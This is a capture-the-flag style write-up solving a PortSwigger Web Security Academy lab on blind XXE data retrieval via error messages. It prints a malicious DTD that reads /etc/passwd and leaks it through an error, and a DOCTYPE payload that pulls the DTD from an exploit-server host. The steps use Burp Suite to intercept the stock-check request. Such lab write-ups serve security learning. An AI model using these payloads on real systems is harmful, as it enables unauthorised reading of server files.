## Lab Description:  Exploiting blind XXE to retrieve data via error messages

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8f42f344-07b3-44db-88ae-298c611e116c)

## Solution:  

Create a malicious DTD - On the exploit server create a malicious DTD file with the following contents,
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Host this malicious.dtd file in our exploit server.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/ffbd75b3-3494-4646-97b0-16ea042918e1)

Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/bf215449-259b-4251-83b8-d2082ff7ba80)

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.  

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/d12f2b5a-9e85-42e9-83a2-2e2174e6b199)

Insert the following external entity definition in between the XML declaration and the stockCheck element:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a54002b038b88bb80b32f35017a00c1.exploit-server.net/exploit"> %xxe;]>
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/85c5f64d-7a9e-4e5d-bbc2-674247f31cac)

Hence we can view the /etc/passwd file in error message 

Lab Solved 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/3024fb56-9a5e-4907-af2f-aa0a485d2627)

